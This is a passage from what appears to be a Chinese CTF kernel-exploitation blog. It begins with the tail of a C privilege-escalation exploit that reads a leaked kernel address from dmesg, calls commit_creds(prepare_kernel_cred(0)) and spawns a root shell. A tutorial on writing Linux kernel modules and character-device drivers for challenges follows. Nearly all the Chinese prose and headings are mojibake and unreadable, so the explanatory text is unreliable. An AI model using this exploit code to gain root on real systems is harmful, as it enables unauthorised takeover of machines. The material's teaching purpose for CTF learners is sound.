fopen(<span class="string">&quot;/tmp/dmesg&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), file)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="built_in">string</span>)) &#123;</span><br><span class="line">            <span class="built_in">strncpy</span>(found,line+<span class="number">53</span>,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(found,<span class="string">&quot;%p&quot;</span>,(<span class="keyword">void</span> **)&amp;addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(addr==<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    dmesg error...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">        : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>     );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>â–²è¿™é‡Œå¦‚æœåŠ äº†SMEPä¿æŠ¤ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°ä¸‹åˆ—çš„é”™è¯¯</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unable to execute userspace code (SMEP?) (uid: 1000)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211004100145.png" alt="image-20211004100138854"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/09/06/Kernel%E4%BB%8E0%E5%BC%80%E5%A7%8B(%E4%B8%80)/">pwnKernelä»0å¼€å§‹(ä¸€)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-09-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-04-14</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1>
      <p>ç½‘ä¸Šä¸€å¤§å †æ•™ç¼–è¯‘å†…æ ¸çš„ï¼Œä½†ç”±äºæˆ‘çš„æ°´å¹³å¤ªèœï¼Œå¾ˆå¤šæ•™ç¨‹æˆ‘çœ‹å¾—ç‰¹åˆ«è¿·ç³Šã€‚è¿˜æœ‰ç¬¬ä¸€æ¬¡ç¼–è¯‘å†…æ ¸æ—¶ï¼Œæ²¡è®¾ç½®å¥½å‚æ•°ï¼Œç›´æ¥æŠŠè™šæ‹Ÿæœºç¼–è¯‘ç‚¸å¼€äº†ã€‚æ‰€ä»¥å°±æƒ³ç€èƒ½ä¸èƒ½å…ˆåšä¸ªä¸€é”®è·å–å†…æ ¸æºç å’Œç›¸å…³vmlinuxä»¥åŠbzImageçš„è„šæœ¬ï¼Œå…ˆè¯•è¯•é¢˜ï¼ŒåæœŸå†æ·±å…¥æ¢ç©¶ç¼–è¯‘å†…æ ¸ï¼ŒåŠ å…¥debugç¬¦å·ä»€ä¹ˆçš„ï¼Œæ‰€ä»¥å°±æœ‰äº†è¿™ä¸ªä¸€é”®è„šæœ¬ã€‚</p>
<p>è¿™ä¸ªç›´æ¥çœ‹æˆ‘çš„é¡¹ç›®å°±å¥½äº†ï¼Œæˆ‘æ˜¯ç›´æ¥æ‹–å®˜æ–¹çš„dockerï¼Œç„¶åæŠŠç¼–è¯‘æ‰€éœ€è¦çš„ç¯å¢ƒéƒ½é‡æ–°å®‰è£…äº†ä¸€éï¼ŒåŸºæœ¬å¯ä»¥é€‚é…æ‰€æœ‰ç¯å¢ƒï¼Œå®‰è£…å„ä¸ªç‰ˆæœ¬çš„å†…æ ¸ï¼Œå¤–åŠ è°ƒè¯•ä¿¡æ¯ä¹Ÿå¯ä»¥é…ç½®</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/kernelAll" >PIG-007/kernelAll (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>å‰ç½®ç¯å¢ƒï¼Œå‰ç½®çŸ¥è¯†å•¥çš„åœ¨ä¸Šé¢å·²ç»è¶³å¤Ÿäº†ï¼Œå¦‚æœè¿˜æ˜¯æ„Ÿè§‰æœ‰ç‚¹è¿·ç³Šå¯ä»¥å†å»æœæœå…¶ä»–æ•™ç¨‹ã€‚çœ‹é›ªçš„<code>é’sir</code>å¸ˆå‚…å’Œcsdnä¸Šçš„<code>ha1vk</code>å¸ˆå‚…å°±å¾ˆä¸é”™å•Šï¼Œè¿˜æœ‰å®‰å…¨å®¢ä¸Šçš„<code>ERROR404</code>å¸ˆå‚…</p>
<p>é’sirå¸ˆå‚…:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/user-818602.htm" >Taçš„è®ºå› (pediy.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ha1vkå¸ˆå‚…:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kernel&t=blog&u=seaaseesa" >kernel- CSDNæœç´¢</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>error404å¸ˆå‚…:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201043" >Kernel Pwn å­¦ä¹ ä¹‹è·¯(ä¸€) - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>è¿™ä¸ªç³»åˆ—è®°å½•æ–°çš„kernelè§£æï¼Œæ—¨åœ¨ä»æºç é¢˜ç›®ç¼–å†™ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬æ¥è¿›è¡Œå„å¼å„æ ·çš„å‡ºé¢˜å¥—è·¯è§£æå’Œexpçš„è§£æã€‚å¦å¤–å†…æ ¸çš„pwnåŸºæœ¬éƒ½æ˜¯åŸºäºæŸä¸ªç‰¹å®šç‰ˆæœ¬çš„å†…æ ¸æ¥è¿›è¡Œæ¨¡å—å¼€å‘ï¼Œè€Œå‡ºæ¼æ´åœ°æ–¹å°±æ˜¯è¿™ä¸ªæ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿™ä¸ªæ¨¡å—æ¥æ”»ç ´å†…æ ¸ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿›è¡Œå†…æ ¸pwnçš„æ—¶å€™ï¼Œæœ€åº”è¯¥å…ˆå­¦ä¹ çš„å°±æ˜¯ä¸€äº›ç®€å•å†…æ ¸é©±åŠ¨æ¨¡å—çš„å¼€å‘ã€‚</p>

        <h1 id="ä¸€ã€ä¾‹å­ç¼–å†™"   >
          <a href="#ä¸€ã€ä¾‹å­ç¼–å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€ä¾‹å­ç¼–å†™" class="headerlink" title="ä¸€ã€ä¾‹å­ç¼–å†™"></a>ä¸€ã€ä¾‹å­ç¼–å†™</h1>
      <p>é¦–å…ˆæœ€ç®€å•å’Œç»å…¸çš„çš„Hello world</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ³¨é‡Šå¤´</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”±äºåŸºæœ¬éƒ½æ˜¯ç”¨ä¸‹è½½çš„å†…æ ¸ç¼–è¯‘ï¼Œæ‰€ä»¥è¿™é‡Œçš„å¤´æ–‡ä»¶ç›´æ¥æ”¾åˆ°æ­£å¸¸çš„ç¼–è¯‘å™¨ä¸­å¯èƒ½æ‰¾ä¸åˆ°å¯¹åº”çš„å¤´æ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="comment">//åœ¨è‡ªå·±ä¸‹è½½çš„ç¼–è¯‘å¥½çš„å†…æ ¸ä¸­è‡ªå·±æ‰¾å¯¹åº”çš„ï¼Œç„¶åMakefileä¸­æ¥è®¾ç½®å†…æ ¸æºç è·¯å¾„</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;PIG007:Hello world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;PIG007:Bye,world\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></div></figure>


        <h2 id="1-å¤´æ–‡ä»¶ç®€ä»‹"   >
          <a href="#1-å¤´æ–‡ä»¶ç®€ä»‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¤´æ–‡ä»¶ç®€ä»‹" class="headerlink" title="1.å¤´æ–‡ä»¶ç®€ä»‹"></a>1.å¤´æ–‡ä»¶ç®€ä»‹</h2>
      <p><code>module.h</code>:åŒ…å«å¯è£…è½½æ¨¡å—éœ€è¦çš„å¤§é‡ç¬¦å·å’Œå‡½æ•°å®šä¹‰ã€‚</p>
<p><code>init.h</code>:æŒ‡å®šåˆå§‹åŒ–æ¨¡å—æ–¹é¢å’Œæ¸…é™¤å‡½æ•°ã€‚</p>
<p>å¦å¤–å¤§éƒ¨åˆ†æ¨¡å—è¿˜åŒ…æ‹¬<code>moduleparam.h</code>å¤´æ–‡ä»¶ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨è£…è½½çš„æ—¶å€™å‘æ¨¡å—ä¼ é€’å‚æ•°ã€‚è€Œæˆ‘ä»¬å¸¸å¸¸ç”¨çš„å‡½æ•°<code>_copy_from_user</code>åˆ™æ¥è‡ªå¤´æ–‡ä»¶<code>uaccess.h</code></p>

        <h2 id="2-æ¨¡å—è®¸å¯è¯"   >
          <a href="#2-æ¨¡å—è®¸å¯è¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ¨¡å—è®¸å¯è¯" class="headerlink" title="2.æ¨¡å—è®¸å¯è¯"></a>2.æ¨¡å—è®¸å¯è¯</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ³¨é‡Šå¤´</span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªå°±æ˜¯æ¨¡å—è®¸å¯è¯ï¼Œ<strong>å…·ä½“æœ‰å•¥ç”¨ä¸å¤ªæ¸…æ¥š</strong>ï¼Œå¦‚æœ‰å¤§ä½¬æ³è¯·å‘ŠçŸ¥ã€‚å¯ä»¥é€šè¿‡ä¸‹åˆ—å‘½ä»¤æŸ¥è¯¢</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;MODULE_LICENSE&quot;</span> -B 27 /usr/src/linux-headers-`uname -r`/include/linux/module.h</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210927101536.png" alt="image-20210927100912684"></p>
<p>æˆ–è€…ç½‘å€<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/latest/translations/zh_CN/process/license-rules.html" >Linuxå†…æ ¸è®¸å¯è§„åˆ™ â€” The Linux Kernel documentation</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="3-æ¨¡å—åŠ è½½å¸è½½"   >
          <a href="#3-æ¨¡å—åŠ è½½å¸è½½" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æ¨¡å—åŠ è½½å¸è½½" class="headerlink" title="3.æ¨¡å—åŠ è½½å¸è½½"></a>3.æ¨¡å—åŠ è½½å¸è½½</h2>
      
        <h3 id="åŠ è½½"   >
          <a href="#åŠ è½½" class="heading-link"><i class="fas fa-link"></i></a><a href="#åŠ è½½" class="headerlink" title="åŠ è½½"></a>åŠ è½½</h3>
      <p>ä¸€èˆ¬ä»¥ __initæ ‡è¯†å£°æ˜ï¼Œè¿”å›å€¼ä¸º0è¡¨ç¤ºåŠ è½½æˆåŠŸï¼Œä¸ºè´Ÿæ•°è¡¨ç¤ºåŠ è½½å¤±è´¥ã€‚ç”¨æ¥åˆå§‹åŒ–ï¼Œå®šä¹‰ä¹‹ç±»çš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br></pre></td></tr></table></div></figure>

<p>åœ¨æ•´ä¸ªæ¨¡å—çš„æœ€ååŠ ä¸Š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module_init(hello_init);</span><br></pre></td></tr></table></div></figure>

<p>æ¥é€šè¿‡è¿™ä¸ªinitå‡½æ•°åŠ è½½æ¨¡å—</p>

        <h3 id="å¸è½½"   >
          <a href="#å¸è½½" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¸è½½" class="headerlink" title="å¸è½½"></a>å¸è½½</h3>
      <p>ä¸€èˆ¬ä»¥ __exitæ ‡è¯†å£°æ˜ï¼Œç”¨æ¥é‡Šæ”¾ç©ºé—´ï¼Œæ¸…é™¤ä¸€äº›ä¸œè¥¿çš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br></pre></td></tr></table></div></figure>

<p>åŒæ ·çš„æ¨¡å—æœ€ååŠ ä¸Šä»¥ä¸‹ä»£ç æ¥å¸è½½</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></div></figure>

<p>â–²å…¶å®åŠ è½½å’Œå¸è½½æœ‰ç‚¹ç±»ä¼¼äºé¢å‘å¯¹è±¡é‡Œçš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ã€‚</p>
<p>ä»¥ä¸Šæ˜¯ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­ï¼Œä¸‹é¢è®²è®²å®é™…é¢˜ç›®çš„ç¼–å†™ï¼Œå®é™…çš„é¢˜ç›®ä¸€èˆ¬æ¶‰åŠé©±åŠ¨çš„è£…è½½ã€‚</p>

        <h1 id="äºŒã€é¢˜ç›®ç¼–å†™"   >
          <a href="#äºŒã€é¢˜ç›®ç¼–å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€é¢˜ç›®ç¼–å†™" class="headerlink" title="äºŒã€é¢˜ç›®ç¼–å†™"></a>äºŒã€é¢˜ç›®ç¼–å†™</h1>
      <p>ç”±äºæ¨¡å—è£…è½½æ˜¯åœ¨å†…æ ¸å¯åŠ¨æ—¶å®Œæˆçš„(rootä¸‹ä¹Ÿå¯ä»¥è®¾ç½®å†insmodè£…è½½)ï¼Œæ‰€ä»¥ä¸€èˆ¬éœ€è¦å®‰è£…é©±åŠ¨ï¼Œé€šè¿‡é©±åŠ¨æ¥å¯åŠ¨æ¨¡å—ä¸­çš„ä»£ç åŠŸèƒ½ã€‚è€Œé©±åŠ¨ç±»å‹ä¹Ÿä¸€èˆ¬æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯å­—ç¬¦å‹è®¾å¤‡é©±åŠ¨ï¼Œä¸€ç§æ˜¯globalmemè™šæ‹Ÿè®¾å¤‡é©±åŠ¨ã€‚</p>
<p>åˆ†é…å¾—åˆ°çš„è®¾å¤‡å·å¯ç”±<code>cat /proc/devices</code>æ¥æŸ¥çœ‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330164118552.png" alt="image-20220330164118552"></p>

        <h2 id="1-å­—ç¬¦å‹è®¾å¤‡é©±åŠ¨"   >
          <a href="#1-å­—ç¬¦å‹è®¾å¤‡é©±åŠ¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å­—ç¬¦å‹è®¾å¤‡é©±åŠ¨" class="headerlink" title="1.å­—ç¬¦å‹è®¾å¤‡é©±åŠ¨"></a>1.å­—ç¬¦å‹è®¾å¤‡é©±åŠ¨</h2>
      
        <h3 id="1-å®‰è£…å¥—è·¯"   >
          <a href="#1-å®‰è£…å¥—è·¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å®‰è£…å¥—è·¯" class="headerlink" title="(1)å®‰è£…å¥—è·¯"></a>(1)å®‰è£…å¥—è·¯</h3>
      <p>é¦–å…ˆäº†è§£ä¸€ä¸‹é©±åŠ¨è®¾å¤‡çš„ç»“æ„ä½“ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///linux/cdev.h   kernel 5.14.8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">// å†…åµŒçš„kobjectå¯¹è±¡</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span>	<span class="comment">// æ‰€å±æ¨¡å—</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span>	<span class="comment">// æ–‡ä»¶æ“ä½œç»“æ„ä½“,ç”¨æ¥è¿›è¡Œäº¤äº’</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="keyword">dev_t</span> dev;				<span class="comment">// è®¾å¤‡å·</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> count;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åå°±æ˜¯å¥—è·¯ç¼–å†™</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®¾å¤‡ç»“æ„ä½“</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xxx_dev_t</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line">&#125; xxx_dev;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾å¤‡é©±åŠ¨æ¨¡å—åŠ è½½å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">xxx_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* DEV_NAME = <span class="string">&#x27;PIG-007&#x27;</span>;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–cdev</span></span><br><span class="line">    cdev_init(&amp;xxx_dev.cdev, &amp;xxx_fops); </span><br><span class="line">    xxx_dev.cdev.owner = THIS_MODULE;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è·å–å­—ç¬¦è®¾å¤‡å·</span></span><br><span class="line">    <span class="keyword">if</span> (xxx_major) &#123;</span><br><span class="line">     	<span class="comment">//ä½¿ç”¨æŒ‡å®šçš„è®¾å¤‡å·è¿›è¡Œåˆ†é…,xxx_dev_noä¸ºè®¾å¤‡å·,1ä¸ºè®¾å¤‡ä¸ªæ•°</span></span><br><span class="line">        register_chrdev_region(xxx_dev_no, <span class="number">1</span>, DEV_NAME);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alloc_chrdev_region(&amp;xxx_dev_no, <span class="number">1</span>, DEV_NAME);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ç”³è¯·è®¾å¤‡å·å¸¸ç”¨alloc_chrdev_region,è¡¨åŠ¨æ€ç”³è¯·è®¾å¤‡å·</span></span><br><span class="line">    <span class="comment">//å¦‚æœæŒ‡å®šåˆ†é…çš„æ—¶å€™å¦‚æœå ç”¨äº†å°±å®¹æ˜“å‡ºé”™</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ³¨å†Œè®¾å¤‡</span></span><br><span class="line">    ret = cdev_add(&amp;xxx_dev.cdev, xxx_dev_no, <span class="number">1</span>); </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è®¾å¤‡é©±åŠ¨æ¨¡å—å¸è½½å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">xxx_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// é‡Šæ”¾å ç”¨çš„è®¾å¤‡å·</span></span><br><span class="line">    unregister_chrdev_region(xxx_dev_no, <span class="number">1</span>); </span><br><span class="line">    cdev_del(&amp;xxx_dev.cdev);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·ç®€å•çš„é©±åŠ¨å°±å®‰è£…å®Œäº†ï¼Œå®‰è£…å®Œäº†ä¹‹åï¼Œæˆ‘ä»¬æƒ³è¦ä½¿ç”¨è¿™ä¸ªé©±åŠ¨çš„è¯ï¼Œè¿˜éœ€è¦è¿›è¡Œäº¤äº’ï¼Œå‘é©±åŠ¨è®¾å¤‡ä¼ é€’æ•°æ®ï¼Œæ‰€ä»¥ä¸Šé¢çš„<code>xxx_fops</code>ï¼Œå³<code>file_operations</code>è¿™ä¸ªç»“æ„ä½“å°±èµ·åˆ°äº†è¿™ä¸ªåŠŸèƒ½ã€‚</p>
<p>æœ‰çš„æ—¶å€™å®‰è£…æ³¨å†Œè®¾å¤‡é©±åŠ¨éœ€è¦ç”¨åˆ°classæ¥åˆ›å»ºæ³¨å†Œï¼ŒåŸå› æœªçŸ¥ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">xxx_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    buffer_var=kmalloc(<span class="number">100</span>,GFP_DMA);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] Module xxx registered&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (alloc_chrdev_region(&amp;dev_no, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;xxx&quot;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((devClass = class_create(THIS_MODULE, <span class="string">&quot;chardrv&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev_region(dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (device_create(devClass, <span class="literal">NULL</span>, dev_no, <span class="literal">NULL</span>, <span class="string">&quot;xxx&quot;</span>) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[i] Module xxx error&quot;</span>);</span><br><span class="line">        class_destroy(devClass);</span><br><span class="line">        unregister_chrdev_region(dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cdev_init(&amp;cdev, &amp;xxx_fops);</span><br><span class="line">    <span 